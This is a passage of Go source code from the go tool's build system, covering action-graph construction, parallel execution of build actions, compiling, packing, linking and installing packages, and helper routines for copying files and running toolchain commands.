		a.target = a.p.target

		// Install header for cgo in c-archive and c-shared modes.
		if p.usesCgo() && (buildBuildmode == "c-archive" || buildBuildmode == "c-shared") {
			ah := &action{
				p:      a.p,
				deps:   []*action{a.deps[0]},
				f:      (*builder).installHeader,
				pkgdir: a.pkgdir,
				objdir: a.objdir,
				target: a.target[:len(a.target)-len(filepath.Ext(a.target))] + ".h",
			}
			a.deps = append(a.deps, ah)
		}

	case modeBuild:
		a.f = (*builder).build
		a.target = a.objpkg
		if a.link {
			// An executable file. (This is the name of a temporary file.)
			// Because we run the temporary file in 'go run' and 'go test',
			// the name will show up in ps listings. If the caller has specified
			// a name, use that instead of a.out. The binary is generated
			// in an otherwise empty subdirectory named exe to avoid
			// naming conflicts.  The only possible conflict is if we were
			// to create a top-level package named exe.
			name := "a.out"
			if p.exeName != "" {
				name = p.exeName
			} else if goos == "darwin" && buildBuildmode == "c-shared" && p.target != "" {
				// On OS X, the linker output name gets recorded in the
				// shared library's LC_ID_DYLIB load command.
				// The code invoking the linker knows to pass only the final
				// path element. Arrange that the path element matches what
				// we'll install it as; otherwise the library is only loadable as "a.out".
				_, name = filepath.Split(p.target)
			}
			a.target = a.objdir + filepath.Join("exe", name) + exeSuffix
		}
	}

	return a
}

func (b *builder) libaction(libname string, pkgs []*Package, mode, depMode buildMode) *action {
	a := &action{}
	switch mode {
	default:
		fatalf("unrecognized mode %v", mode)

	case modeBuild:
		a.f = (*builder).linkShared
		a.target = filepath.Join(b.work, libname)
		for _, p := range pkgs {
			if p.target == "" {
				continue
			}
			a.deps = append(a.deps, b.action(depMode, depMode, p))
		}

	case modeInstall:
		// Currently build mode shared forces external linking mode, and
		// external linking mode forces an import of runtime/cgo (and
		// math on arm). So if it was not passed on the command line and
		// it is not present in another shared library, add it here.
		_, gccgo := buildToolchain.(gccgoToolchain)
		if !gccgo {
			seencgo := false
			for _, p := range pkgs {
				seencgo = seencgo || (p.Standard && p.ImportPath == "runtime/cgo")
			}
			if !seencgo {
				var stk importStack
				p := loadPackage("runtime/cgo", &stk)
				if p.Error != nil {
					fatalf("load runtime/cgo: %v", p.Error)
				}
				computeStale(p)
				// If runtime/cgo is in another shared library, then that's
				// also the shared library that contains runtime, so
				// something will depend on it and so runtime/cgo's staleness
				// will be checked when processing that library.
				if p.Shlib == "" || p.Shlib == libname {
					pkgs = append([]*Package{}, pkgs...)
					pkgs = append(pkgs, p)
				}
			}
			if goarch == "arm" {
				seenmath := false
				for _, p := range pkgs {
					seenmath = seenmath || (p.Standard && p.ImportPath == "math")
				}
				if !seenmath {
					var stk importStack
					p := loadPackage("math", &stk)
					if p.Error != nil {
						fatalf("load math: %v", p.Error)
					}
					computeStale(p)
					// If math is in another shared library, then that's
					// also the shared library that contains runtime, so
					// something will depend on it and so math's staleness
					// will be checked when processing that library.
					if p.Shlib == "" || p.Shlib == libname {
						pkgs = append([]*Package{}, pkgs...)
						pkgs = append(pkgs, p)
					}
				}
			}
		}

		// Figure out where the library will go.
		var libdir string
		for _, p := range pkgs {
			plibdir := p.build.PkgTargetRoot
			if gccgo {
				plibdir = filepath.Join(plibdir, "shlibs")
			}
			if libdir == "" {
				libdir = plibdir
			} else if libdir != plibdir {
				fatalf("multiple roots %s & %s", libdir, plibdir)
			}
		}
		a.target = filepath.Join(libdir, libname)

		// Now we can check whether we need to rebuild it.
		stale := false
		var built time.Time
		if fi, err := os.Stat(a.target); err == nil {
			built = fi.ModTime()
		}
		for _, p := range pkgs {
			if p.target == "" {
				continue
			}
			stale = stale || p.Stale
			lstat, err := os.Stat(p.target)
			if err != nil || lstat.ModTime().After(built) {
				stale = true
			}
			a.deps = append(a.deps, b.action1(depMode, depMode, p, false, a.target))
		}

		if stale {
			a.f = (*builder).install
			buildAction := b.libaction(libname, pkgs, modeBuild, depMode)
			a.deps = []*action{buildAction}
			for _, p := range pkgs {
				if p.target == "" {
					continue
				}
				shlibnameaction := &action{}
				shlibnameaction.f = (*builder).installShlibname
				shlibnameaction.target = p.target[:len(p.target)-2] + ".shlibname"
				a.deps = append(a.deps, shlibnameaction)
				shlibnameaction.deps = append(shlibnameaction.deps, buildAction)
			}
		}
	}
	return a
}

// actionList returns the list of actions in the dag rooted at root
// as visited in a depth-first post-order traversal.
func actionList(root *action) []*action {
	seen := map[*action]bool{}
	all := []*action{}
	var walk func(*action)
	walk = func(a *action) {
		if seen[a] {
			return
		}
		seen[a] = true
		for _, a1 := range a.deps {
			walk(a1)
		}
		all = append(all, a)
	}
	walk(root)
	return all
}

// allArchiveActions returns a list of the archive dependencies of root.
// This is needed because if package p depends on package q that is in libr.so, the
// action graph looks like p->libr.so->q and so just scanning through p's
// dependencies does not find the import dir for q.
func allArchiveActions(root *action) []*action {
	seen := map[*action]bool{}
	r := []*action{}
	var walk func(*action)
	walk = func(a *action) {
		if seen[a] {
			return
		}
		seen[a] = true
		if strings.HasSuffix(a.target, ".so") || a == root {
			for _, a1 := range a.deps {
				walk(a1)
			}
		} else if strings.HasSuffix(a.target, ".a") {
			r = append(r, a)
		}
	}
	walk(root)
	return r
}

// do runs the action graph rooted at root.
func (b *builder) do(root *action) {
	// Build list of all actions, assigning depth-first post-order priority.
	// The original implementation here was a true queue
	// (using a channel) but it had the effect of getting
	// distracted by low-level leaf actions to the detriment
	// of completing higher-level actions.  The order of
	// work does not matter much to overall execution time,
	// but when running "go test std" it is nice to see each test
	// results as soon as possible.  The priorities assigned
	// ensure that, all else being equal, the execution prefers
	// to do what it would have done first in a simple depth-first
	// dependency order traversal.
	all := actionList(root)
	for i, a := range all {
		a.priority = i
	}

	b.readySema = make(chan bool, len(all))

	// Initialize per-action execution state.
	for _, a := range all {
		for _, a1 := range a.deps {
			a1.triggers = append(a1.triggers, a)
		}
		a.pending = len(a.deps)
		if a.pending == 0 {
			b.ready.push(a)
			b.readySema <- true
		}
	}

	// Handle runs a single action and takes care of triggering
	// any actions that are runnable as a result.
	handle := func(a *action) {
		var err error
		if a.f != nil && (!a.failed || a.ignoreFail) {
			err = a.f(b, a)
		}

		// The actions run in parallel but all the updates to the
		// shared work state are serialized through b.exec.
		b.exec.Lock()
		defer b.exec.Unlock()

		if err != nil {
			if err == errPrintedOutput {
				setExitStatus(2)
			} else {
				errorf("%s", err)
			}
			a.failed = true
		}

		for _, a0 := range a.triggers {
			if a.failed {
				a0.failed = true
			}
			if a0.pending--; a0.pending == 0 {
				b.ready.push(a0)
				b.readySema <- true
			}
		}

		if a == root {
			close(b.readySema)
		}
	}

	var wg sync.WaitGroup

	// Kick off goroutines according to parallelism.
	// If we are using the -n flag (just printing commands)
	// drop the parallelism to 1, both to make the output
	// deterministic and because there is no real work anyway.
	par := buildP
	if buildN {
		par = 1
	}
	for i := 0; i < par; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for {
				select {
				case _, ok := <-b.readySema:
					if !ok {
						return
					}
					// Receiving a value from b.readySema entitles
					// us to take from the ready queue.
					b.exec.Lock()
					a := b.ready.pop()
					b.exec.Unlock()
					handle(a)
				case <-interrupted:
					setExitStatus(1)
					return
				}
			}
		}()
	}

	wg.Wait()
}

// hasString reports whether s appears in the list of strings.
func hasString(strings []string, s string) bool {
	for _, t := range strings {
		if s == t {
			return true
		}
	}
	return false
}

// build is the action for building a single package or command.
func (b *builder) build(a *action) (err error) {
	// Return an error if the package has CXX files but it's not using
	// cgo nor SWIG, since the CXX files can only be processed by cgo
	// and SWIG.
	if len(a.p.CXXFiles) > 0 && !a.p.usesCgo() && !a.p.usesSwig() {
		return fmt.Errorf("can't build package %s because it contains C++ files (%s) but it's not using cgo nor SWIG",
			a.p.ImportPath, strings.Join(a.p.CXXFiles, ","))
	}
	// Same as above for Objective-C files
	if len(a.p.MFiles) > 0 && !a.p.usesCgo() && !a.p.usesSwig() {
		return fmt.Errorf("can't build package %s because it contains Objective-C files (%s) but it's not using cgo nor SWIG",
			a.p.ImportPath, strings.Join(a.p.MFiles, ","))
	}
	defer func() {
		if err != nil && err != errPrintedOutput {
			err = fmt.Errorf("go build %s: %v", a.p.ImportPath, err)
		}
	}()
	if buildN {
		// In -n mode, print a banner between packages.
		// The banner is five lines so that when changes to
		// different sections of the bootstrap script have to
		// be merged, the banners give patch something
		// to use to find its context.
		b.print("\n#\n# " + a.p.ImportPath + "\n#\n\n")
	}

	if buildV {
		b.print(a.p.ImportPath + "\n")
	}

	// Make build directory.
	obj := a.objdir
	if err := b.mkdir(obj); err != nil {
		return err
	}

	// make target directory
	dir, _ := filepath.Split(a.target)
	if dir != "" {
		if err := b.mkdir(dir); err != nil {
			return err
		}
	}

	var gofiles, cgofiles, cfiles, sfiles, cxxfiles, objects, cgoObjects, pcCFLAGS, pcLDFLAGS []string

	gofiles = append(gofiles, a.p.GoFiles...)
	cgofiles = append(cgofiles, a.p.CgoFiles...)
	cfiles = append(cfiles, a.p.CFiles...)
	sfiles = append(sfiles, a.p.SFiles...)
	cxxfiles = append(cxxfiles, a.p.CXXFiles...)

	if a.p.usesCgo() || a.p.usesSwig() {
		if pcCFLAGS, pcLDFLAGS, err = b.getPkgConfigFlags(a.p); err != nil {
			return
		}
	}

	// Run SWIG on each .swig and .swigcxx file.
	// Each run will generate two files, a .go file and a .c or .cxx file.
	// The .go file will use import "C" and is to be processed by cgo.
	if a.p.usesSwig() {
		outGo, outC, outCXX, err := b.swig(a.p, obj, pcCFLAGS)
		if err != nil {
			return err
		}
		cgofiles = append(cgofiles, outGo...)
		cfiles = append(cfiles, outC...)
		cxxfiles = append(cxxfiles, outCXX...)
	}

	// Run cgo.
	if a.p.usesCgo() || a.p.usesSwig() {
		// In a package using cgo, cgo compiles the C, C++ and assembly files with gcc.
		// There is one exception: runtime/cgo's job is to bridge the
		// cgo and non-cgo worlds, so it necessarily has files in both.
		// In that case gcc only gets the gcc_* files.
		var gccfiles []string
		if a.p.Standard && a.p.ImportPath == "runtime/cgo" {
			filter := func(files, nongcc, gcc []string) ([]string, []string) {
				for _, f := range files {
					if strings.HasPrefix(f, "gcc_") {
						gcc = append(gcc, f)
					} else {
						nongcc = append(nongcc, f)
					}
				}
				return nongcc, gcc
			}
			cfiles, gccfiles = filter(cfiles, cfiles[:0], gccfiles)
			sfiles, gccfiles = filter(sfiles, sfiles[:0], gccfiles)
		} else {
			gccfiles = append(cfiles, sfiles...)
			cfiles = nil
			sfiles = nil
		}

		cgoExe := tool("cgo")
		if a.cgo != nil && a.cgo.target != "" {
			cgoExe = a.cgo.target
		}
		outGo, outObj, err := b.cgo(a.p, cgoExe, obj, pcCFLAGS, pcLDFLAGS, cgofiles, gccfiles, cxxfiles, a.p.MFiles)
		if err != nil {
			return err
		}
		cgoObjects = append(cgoObjects, outObj...)
		gofiles = append(gofiles, outGo...)
	}

	if len(gofiles) == 0 {
		return &build.NoGoError{Dir: a.p.Dir}
	}

	// If we're doing coverage, preprocess the .go files and put them in the work directory
	//fmt.Println("printing a.p struct")
	//fmt.Printf("%+v\n", a.p)
	if a.p.coverMode != "" {
		for i, file := range gofiles {
			var sourceFile string
			var coverFile string
			var key string
			if strings.HasSuffix(file, ".cgo1.go") {
				// cgo files have absolute paths
				base := filepath.Base(file)
				sourceFile = file
				coverFile = filepath.Join(obj, base)
				key = strings.TrimSuffix(base, ".cgo1.go") + ".go"
			} else {
				sourceFile = filepath.Join(a.p.Dir, file)
				coverFile = filepath.Join(obj, file)
				key = file
			}
			cover := a.p.coverVars[key]
			if cover == nil || isTestFile(file) {
				// Not covering this file.
				continue
			}
			if err := b.cover(a, coverFile, sourceFile, 0666, cover.Var); err != nil {
				return err
			}
			gofiles[i] = coverFile
		}
	}

	// Prepare Go import path list.
	inc := b.includeArgs("-I", allArchiveActions(a))

	// Compile Go.
	ofile, out, err := buildToolchain.gc(b, a.p, a.objpkg, obj, len(sfiles) > 0, inc, gofiles)
	if len(out) > 0 {
		b.showOutput(a.p.Dir, a.p.ImportPath, b.processOutput(out))
		if err != nil {
			return errPrintedOutput
		}
	}
	if err != nil {
		return err
	}
	if ofile != a.objpkg {
		objects = append(objects, ofile)
	}

	// Copy .h files named for goos or goarch or goos_goarch
	// to names using GOOS and GOARCH.
	// For example, defs_linux_amd64.h becomes defs_GOOS_GOARCH.h.
	_goos_goarch := "_" + goos + "_" + goarch
	_goos := "_" + goos
	_goarch := "_" + goarch
	for _, file := range a.p.HFiles {
		name, ext := fileExtSplit(file)
		switch {
		case strings.HasSuffix(name, _goos_goarch):
			targ := file[:len(name)-len(_goos_goarch)] + "_GOOS_GOARCH." + ext
			if err := b.copyFile(a, obj+targ, filepath.Join(a.p.Dir, file), 0644, true); err != nil {
				return err
			}
		case strings.HasSuffix(name, _goarch):
			targ := file[:len(name)-len(_goarch)] + "_GOARCH." + ext
			if err := b.copyFile(a, obj+targ, filepath.Join(a.p.Dir, file), 0644, true); err != nil {
				return err
			}
		case strings.HasSuffix(name, _goos):
			targ := file[:len(name)-len(_goos)] + "_GOOS." + ext
			if err := b.copyFile(a, obj+targ, filepath.Join(a.p.Dir, file), 0644, true); err != nil {
				return err
			}
		}
	}

	for _, file := range cfiles {
		out := file[:len(file)-len(".c")] + ".o"
		if err := buildToolchain.cc(b, a.p, obj, obj+out, file); err != nil {
			return err
		}
		objects = append(objects, out)
	}

	// Assemble .s files.
	for _, file := range sfiles {
		out := file[:len(file)-len(".s")] + ".o"
		if err := buildToolchain.asm(b, a.p, obj, obj+out, file); err != nil {
			return err
		}
		objects = append(objects, out)
	}

	// NOTE(rsc): On Windows, it is critically important that the
	// gcc-compiled objects (cgoObjects) be listed after the ordinary
	// objects in the archive.  I do not know why this is.
	// https://golang.org/issue/2601
	objects = append(objects, cgoObjects...)

	// Add system object files.
	for _, syso := range a.p.SysoFiles {
		objects = append(objects, filepath.Join(a.p.Dir, syso))
	}

	// Pack into archive in obj directory.
	// If the Go compiler wrote an archive, we only need to add the
	// object files for non-Go sources to the archive.
	// If the Go compiler wrote an archive and the package is entirely
	// Go sources, there is no pack to execute at all.
	if len(objects) > 0 {
		if err := buildToolchain.pack(b, a.p, obj, a.objpkg, objects); err != nil {
			return err
		}
	}

	// Link if needed.
	if a.link {
		// The compiler only cares about direct imports, but the
		// linker needs the whole dependency tree.
		all := actionList(a)
		all = all[:len(all)-1] // drop a
		if err := buildToolchain.ld(b, a, a.target, all, a.objpkg, objects); err != nil {
			return err
		}
	}

	return nil
}

// Calls pkg-config if needed and returns the cflags/ldflags needed to build the package.
func (b *builder) getPkgConfigFlags(p *Package) (cflags, ldflags []string, err error) {
	if pkgs := p.CgoPkgConfig; len(pkgs) > 0 {
		var out []byte
		out, err = b.runOut(p.Dir, p.ImportPath, nil, "pkg-config", "--cflags", pkgs)
		if err != nil {
			b.showOutput(p.Dir, "pkg-config --cflags "+strings.Join(pkgs, " "), string(out))
			b.print(err.Error() + "\n")
			err = errPrintedOutput
			return
		}
		if len(out) > 0 {
			cflags = strings.Fields(string(out))
		}
		out, err = b.runOut(p.Dir, p.ImportPath, nil, "pkg-config", "--libs", pkgs)
		if err != nil {
			b.showOutput(p.Dir, "pkg-config --libs "+strings.Join(pkgs, " "), string(out))
			b.print(err.Error() + "\n")
			err = errPrintedOutput
			return
		}
		if len(out) > 0 {
			ldflags = strings.Fields(string(out))
		}
	}
	return
}

func (b *builder) installShlibname(a *action) error {
	a1 := a.deps[0]
	err := ioutil.WriteFile(a.target, []byte(filepath.Base(a1.target)+"\n"), 0644)
	if err != nil {
		return err
	}
	if buildX {
		b.showcmd("", "echo '%s' > %s # internal", filepath.Base(a1.target), a.target)
	}
	return nil
}

func (b *builder) linkShared(a *action) (err error) {
	allactions := actionList(a)
	allactions = allactions[:len(allactions)-1]
	return buildToolchain.ldShared(b, a.deps, a.target, allactions)
}

// install is the action for installing a single package or executable.
func (b *builder) install(a *action) (err error) {
	defer func() {
		if err != nil && err != errPrintedOutput {
			err = fmt.Errorf("go install %s: %v", a.p.ImportPath, err)
		}
	}()
	a1 := a.deps[0]
	perm := os.FileMode(0644)
	if a1.link {
		switch buildBuildmode {
		case "c-archive", "c-shared":
		default:
			perm = 0755
		}
	}

	// make target directory
	dir, _ := filepath.Split(a.target)
	if dir != "" {
		if err := b.mkdir(dir); err != nil {
			return err
		}
	}

	// remove object dir to keep the amount of
	// garbage down in a large build.  On an operating system
	// with aggressive buffering, cleaning incrementally like
	// this keeps the intermediate objects from hitting the disk.
	if !buildWork {
		defer os.RemoveAll(a1.objdir)
		defer os.Remove(a1.target)
	}

	return b.moveOrCopyFile(a, a.target, a1.target, perm, false)
}

// includeArgs returns the -I or -L directory list for access
// to the results of the list of actions.
func (b *builder) includeArgs(flag string, all []*action) []string {
	inc := []string{}
	incMap := map[string]bool{
		b.work:    true, // handled later
		gorootPkg: true,
		"":        true, // ignore empty strings
	}

	// Look in the temporary space for results of test-specific actions.
	// This is the $WORK/my/package/_test directory for the
	// package being built, so there are few of these.
	for _, a1 := range all {
		if a1.p == nil {
			continue
		}
		if dir := a1.pkgdir; dir != a1.p.build.PkgRoot && !incMap[dir] {
			incMap[dir] = true
			inc = append(inc, flag, dir)
		}
	}

	// Also look in $WORK for any non-test packages that have
	// been built but not installed.
	inc = append(inc, flag, b.work)

	// Finally, look in the installed package directories for each action.
	for _, a1 := range all {
		if a1.p == nil {
			continue
		}
		if dir := a1.pkgdir; dir == a1.p.build.PkgRoot && !incMap[dir] {
			incMap[dir] = true
			inc = append(inc, flag, a1.p.build.PkgTargetRoot)
		}
	}

	return inc
}

// moveOrCopyFile is like 'mv src dst' or 'cp src dst'.
func (b *builder) moveOrCopyFile(a *action, dst, src string, perm os.FileMode, force bool) error {
	if buildN {
		b.showcmd("", "mv %s %s", src, dst)
		return nil
	}

	// If we can update the mode and rename to the dst, do it.
	// Otherwise fall back to standard copy.
	if err := os.Chmod(src, perm); err == nil {
		if err := os.Rename(src, dst); err == nil {
			if buildX {
				b.showcmd("", "mv %s %s", src, dst)
			}
			return nil
		}
	}

	return b.copyFile(a, dst, src, perm, force)
}

// copyFile is like 'cp src dst'.
func (b *builder) copyFile(a *action, dst, src string, perm os.FileMode, force bool) error {
	if buildN || buildX {
		b.showcmd("", "cp %s %s", src, dst)
		if buildN {
			return nil
		}
	}

	sf, err := os.Open(src)
	if err != nil {
		return err
	}
	defer sf.Close()

	// Be careful about removing/overwriting dst.
	// Do not remove/overwrite if dst exists and is a directory
	// or a non-object file.
	if fi, err := os.Stat(dst); err == nil {
		if fi.IsDir() {
			return fmt.Errorf("build output %q already exists and is a directory", dst)
		}
		if !force && fi.Mode().IsRegular() && !isObject(dst) {
			return fmt.Errorf("build output %q already exists and is not an object file", dst)
		}
	}

	// On Windows, remove lingering ~ file from last attempt.
	if toolIsWindows {
		if _, err := os.Stat(dst + "~"); err == nil {
			os.Remove(dst + "~")
		}
	}

	mayberemovefile(dst)
	df, err := os.OpenFile(dst, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, perm)
	if err != nil && toolIsWindows {
		// Windows does not allow deletion of a binary file
		// while it is executing.  Try to move it out of the way.
		// If the move fails, which is likely, we'll try again the
		// next time we do an install of this binary.
		if err := os.Rename(dst, dst+"~"); err == nil {
			os.Remove(dst + "~")
		}
		df, err = os.OpenFile(dst, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, perm)
	}
	if err != nil {
		return err
	}

	_, err = io.Copy(df, sf)
	df.Close()
	if err != nil {
		mayberemovefile(dst)
		return fmt.Errorf("copying %s to %s: %v", src, dst, err)
	}
	return nil
}

// Install the cgo export header file, if there is one.
func (b *builder) installHeader(a *action) error {
	src := a.objdir + "_cgo_install.h"
	if _, err := os.Stat(src); os.IsNotExist(err) {
		// If the file does not exist, there are no exported
		// functions, and we do not install anything.
		return nil
	}

	dir, _ := filepath.Split(a.target)
	if dir != "" {
		if err := b.mkdir(dir); err != nil {
			return err
		}
	}

	return b.moveOrCopyFile(a, a.target, src, 0644, true)
}

// cover runs, in effect,
//	go tool cover -mode=b.coverMode -var="varName" -o dst.go src.go
func (b *builder) cover(a *action, dst, src string, perm os.FileMode, varName string) error {
	return b.run(a.objdir, "cover "+a.p.ImportPath, nil,
		buildToolExec,
		tool("cover"),
		"-mode", a.p.coverMode,
		"-var", varName,
		"-o", dst,
		src)
}

var objectMagic = [][]byte{
	{'!', '<', 'a', 'r', 'c', 'h', '>', '\n'}, // Package archive
	{'\x7F', 'E', 'L', 'F'},                   // ELF
	{0xFE, 0xED, 0xFA, 0xCE},                  // Mach-O big-endian 32-bit
	{0xFE, 0xED, 0xFA, 0xCF},                  // Mach-O big-endian 64-bit
	{0xCE, 0xFA, 0xED, 0xFE},                  // Mach-O little-endian 32-bit
	{0xCF, 0xFA, 0xED, 0xFE},                  // Mach-O little-endian 64-bit
	{0x4d, 0x5a, 0x90, 0x00, 0x03, 0x00},      // PE (Windows) as generated by 6l/8l and gcc
	{0x00, 0x00, 0x01, 0xEB},                  // Plan 9 i386
	{0x00, 0x00, 0x8a, 0x97},                  // Plan 9 amd64
}

func isObject(s string) bool {
	f, err := os.Open(s)
	if err != nil {
		return false
	}
	defer f.Close()
	buf := make([]byte, 64)
	io.ReadFull(f, buf)
	for _, magic := range objectMagic {
		if bytes.HasPrefix(buf, magic) {
			return true
		}
	}
	return false
}

// mayberemovefile removes a file only if it is a regular file
// When running as a user with sufficient privileges, we may delete
// even device files, for example, which is not intended.
func mayberemovefile(s string) {
	if fi, err := os.Lstat(s); err == nil && !fi.Mode().IsRegular() {
		return
	}
	os.Remove(s)
}

// fmtcmd formats a command in the manner of fmt.Sprintf but also:
//
//	If dir is non-empty and the script is not in dir right now,
//	fmtcmd inserts "cd dir\n" before the command.
//
//	fmtcmd replaces the value of b.work with $WORK.
//	fmtcmd replaces the value of goroot with $GOROOT.
//	fmtcmd replaces the value of b.gobin with $GOBIN.
//
//	fmtcmd replaces the name of the current directory with dot (.)
//	but only when it is at the beginning of a space-separated token.
//
func (b *builder) fmtcmd(dir string, format string, args ...interface{}) string {
	cmd := fmt.Sprintf(format, args...)
	if dir != "" && dir != "/" {
		cmd = strings.Replace(" "+cmd, " "+dir, " .", -1)[1:]
		if b.scriptDir != dir {
			b.scriptDir = dir
			cmd = "cd " + dir + "\n" + cmd
		}
	}
	if b.work != "" {
		cmd = strings.Replace(cmd, b.work, "$WORK", -1)
	}
	return cmd
}

// showcmd prints the given command to standard output
// for the implementation of -n or -x.
func (b *builder) showcmd(dir string, format string, args ...interface{}) {
	b.output.Lock()
	defer b.output.Unlock()
	b.print(b.fmtcmd(dir, format, args...) + "\n")
}

// showOutput prints "# desc" followed by the given output.
// The output is expected to contain references to 'dir', usually
// the source directory for the package that has failed to build.
// showOutput rewrites mentions of dir with a relative path to dir
// when the relative path is shorter.  This is usually more pleasant.
// For example, if fmt doesn't compile and we are in src/html,
// the output is
//
//	$ go build
//	# fmt
//	../fmt/print.go:1090: undefined: asdf
//	$
//
// instead of
//
//	$ go build
//	# fmt
//	/usr/gopher/go/src/fmt/print.go:1090: undefined: asdf
//	$
//
// showOutput also replaces references to the work directory with $WORK.
//
func (b *builder) showOutput(dir, desc, out string) {
	prefix := "# " + desc
	suffix := "\n" + out
	if reldir := shortPath(dir); reldir != dir {
		suffix = strings.Replace(suffix, " "+dir, " "+reldir, -1)
		suffix = strings.Replace(suffix, "\n"+dir, "\n"+reldir, -1)
	}
	suffix = strings.Replace(suffix, " "+b.work, " $WORK", -1)

	b.output.Lock()
	defer b.output.Unlock()
	b.print(prefix, suffix)
}

// shortPath returns an absolute or relative name for path, whatever is shorter.
func shortPath(path string) string {
	if rel, err := filepath.Rel(cwd, path); err == nil && len(rel) < len(path) {
		return rel
	}
	return path
}

// relPaths returns a copy of paths with absolute paths
// made relative to the current directory if they would be shorter.
func relPaths(paths []string) []string {
	var out []string
	pwd, _ := os.Getwd()
	for _, p := range paths {
		rel, err := filepath.Rel(pwd, p)
		if err == nil && len(rel) < len(p) {
			p = rel
		}
		out = append(out, p)
	}
	return out
}

// errPrintedOutput is a special error indicating that a command failed
// but that it generated output as well, and that output has already
// been printed, so there's no point showing 'exit status 1' or whatever
// the wait status was.  The main executor, builder.do, knows not to
// print this error.
var errPrintedOutput = errors.New("already printed output - no need to show error")

var cgoLine = regexp.MustCompile(`\[[^\[\]]+\.cgo1\.go:[0-9]+\]`)
var cgoTypeSigRe = regexp.MustCompile(`\b_Ctype_\B`)

// run runs the command given by cmdline in the directory dir.
// If the command fails, run prints information about the failure
// and returns a non-nil error.
func (b *builder) run(dir string, desc string, env []string, cmdargs ...interface{}) error {
	out, err := b.runOut(dir, desc, env, cmdargs...)
	if len(out) > 0 {
		if desc == "" {
			desc = b.fmtcmd(dir, "%s", strings.Join(stringList(cmdargs...), " "))
		}
		b.showOutput(dir, desc, b.processOutput(out))
		if err != nil {
			err = errPrintedOutput
		}
	}
	return err
}

// processOutput prepares the output of runOut to be output to the console.
func (b *builder) processOutput(out []byte) string {
	if out[len(out)-1] != '\n' {
		out = append(out, '\n')
	}
	messages := string(out)
	// Fix up output referring to cgo-generated code to be more readable.
	// Replace x.go:19[/tmp/.../x.cgo1.go:18] with x.go:19.
	// Replace *[100]_Ctype_foo with *[100]C.foo.
	// If we're using -x, assume we're debugging and want the full dump, so disable the rewrite.
	if !buildX && cgoLine.MatchString(messages) {
		messages = cgoLine.ReplaceAllString(messages, "")
		messages = cgoTypeSigRe.ReplaceAllString(messages, "C.")
	}
	return messages
}

// runOut runs the command given by cmdline in the directory dir.
// It returns the command output and any errors that occurred.
func (b *builder) runOut(dir string, desc string, env []string, cmdargs ...interface{}) ([]byte, error) {
	cmdline := stringList(cmdargs...)
	if buildN || buildX {
		var envcmdline string
		for i := range env {
			envcmdline += env[i]
			envcmdline += " "
		}
		envcmdline += joinUnambiguously(cmdline)
		b.showcmd(dir, "%s", envcmdline)
		if buildN {
			return nil, nil
		}
	}

	nbusy := 0
	for {
		var buf bytes.Buffer
		cmd := exec.Command(cmdline[0], cmdline[1:]...)
		cmd.Stdout = &buf
		cmd.Stderr = &buf
		cmd.Dir = dir
		cmd.Env = mergeEnvLists(env, envForDir(cmd.Dir, os.Environ()))
		err := cmd.Run()

		// cmd.Run will fail on Unix if some other process has the binary
		// we want to run open for writing.  This can happen here because
		// we build and install the cgo command and then run it.
		// If another command was kicked off while we were writing the
		// cgo binary, the child process for that command may be holding
		// a reference to the fd, keeping us from running exec.
		//
		// But, you might reasonably wonder, how can this happen?
		// The cgo fd, like all our fds, is close-on-exec, so that we need
		// not worry about other processes inheriting the fd accidentally.
		// The answer is that running a command is fork and exec.
		// A child forked while the cgo fd is open inherits that fd.
		// Until the child has called exec, it holds the fd open and the
		// kernel will not let us run cgo.  Even if the child were to close
		// the fd explicitly, it would still be open from the time of the fork
		// until the time of the explicit close, and the race would remain.
		//
		// On Unix systems, this results in ETXTBSY, which formats
		// as "text file busy".  Rather than hard-code specific error cases,
		// we just look for that string.  If this happens, sleep a little
		// and try again.  We let this happen three times, with increasing
		// sleep lengths: 100+200+400 ms = 0.7 seconds.
		//
		// An alternate solution might be to split the cmd.Run into
		// separate cmd.Start and cmd.Wait, and then use an RWLock
		// to make sure that copyFile only executes when no cmd.Start
		// call is in progress.  However, cmd.Start (really syscall.forkExec)
		// only guarantees that when it returns, the exec is committed to
		// happen and succeed.  It uses a close-on-exec file descriptor
		// itself to determine this, so we know that when cmd.Start returns,
		// at least one close-on-exec file descriptor has been closed.
		// However, we cannot be sure that all of them have been closed,
		// so the program might still encounter ETXTBSY even with such
		// an RWLock.  The race window would be smaller, perhaps, but not
		// guaranteed to be gone.
		//
		// Sleeping when we observe the race seems to be the most reliable
		// option we have.
		//
		// https://golang.org/issue/3001
		//
		if err != nil && nbusy < 3 && strings.Contains(err.Error(), "text file busy") {
			time.Sleep(100 * time.Millisecond << uint(nbusy))
			nbusy++
			continue
		}

		// err can be something like 'exit status 1'.
		// Add information about what program was running.
		// Note that if buf.Bytes() is non-empty, the caller usually
		// shows buf.Bytes() and does not print err at all, so the
		// prefix here does not make most output any more verbose.
		if err != nil {
			err = errors.New(cmdline[0] + ": " + err.Error())
		}
		return buf.Bytes(), err
	}
}

// joinUnambiguously prints the slice, quoting where necessary to make the
// output unambiguous.
// TODO: See issue 5279. The printing of commands needs a complete redo.
func joinUnambiguously(a []string) string {
	var buf bytes.Buffer
	for i, s := range a {
		if i > 0 {
			buf.WriteByte(' ')
		}
		q := strconv.Quote(s)
		if s == "" || strings.Contains(s, " ") || len(q) > len(s)+2 {
			buf.WriteString(q)
		} else {
			buf.WriteString(s)
		}
	}
	return buf.String()
}

// mkdir makes the named directory.
func (b *builder) mkdir(dir string) error {
	b.exec.Lock()
	defer b.exec.Unlock()
	// We can be a little aggressive about being
	// sure directories exist.  Skip repeated calls.
	if b.mkdirCache[dir] {
		return nil
	}
	b.mkdirCache[dir] = true

	if buildN || buildX {
		b.showcmd("", "mkdir -p %s", dir)
		if buildN {
			return nil
		}
	}

	if err := os.MkdirAll(dir, 0777); err != nil {
		return err
	}
	return nil
}

// mkAbs returns an absolute path corresponding to
// evaluating f in the directory dir.
// We always pass absolute paths of source files so that
// the error messages will include the full path to a file
// in need of attention.
func mkAbs(dir, f string) string {
	// Leave absolute paths alone.
	// Also, during -n mode we use the pseudo-directory $WORK
	// instead of creating an actual work directory that won't be used.
	// Leave paths beginning with $WORK alone too.
	if filepath.IsAbs(f) || strings.HasPrefix(f, "$WORK") {
		return f
	}
	return filepath.Join(dir, f)
}

type toolchain interface {
	// gc runs the compiler in a specific directory on a set of files
	// and returns the name of the generated output file.
	// The compiler runs in the directory dir.
	gc(b *builder, p *Package, archive, obj string, asmhdr bool, importArgs []string, gofiles []string) (ofile string, out []byte, err error)
	// cc runs the toolchain's C compiler in a directory on a C file
	// to produce an output file.
